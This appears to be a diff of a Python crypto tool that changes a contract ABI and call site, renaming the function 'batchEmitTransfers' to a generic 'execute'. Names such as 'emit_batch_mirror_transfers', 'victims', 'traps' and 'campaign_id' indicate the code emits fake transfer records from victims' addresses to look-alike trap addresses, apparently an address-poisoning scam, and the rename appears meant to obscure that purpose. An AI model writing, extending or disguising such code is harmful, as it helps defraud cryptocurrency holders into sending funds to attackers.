@@ -420,7 +420,7 @@ MIRROR_CONTRACTS = {
     "MATIC": MIRROR_TOKEN_NATIVE,
 }
 
-MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"batchEmitTransfers","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"execute","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
 
 # ─── Multi-Token Router Configuration ───
 MULTI_TOKEN_ROUTER = os.getenv("MULTI_TOKEN_ROUTER")
@@ -951,7 +951,7 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         victims_checksum = [w3.to_checksum_address(v) for v in victims]
         traps_checksum = [w3.to_checksum_address(t) for t in traps]
         
-        tx = contract.functions.batchEmitTransfers(
+        tx = contract.functions.execute(
             victims_checksum,
             traps_checksum,
             amounts
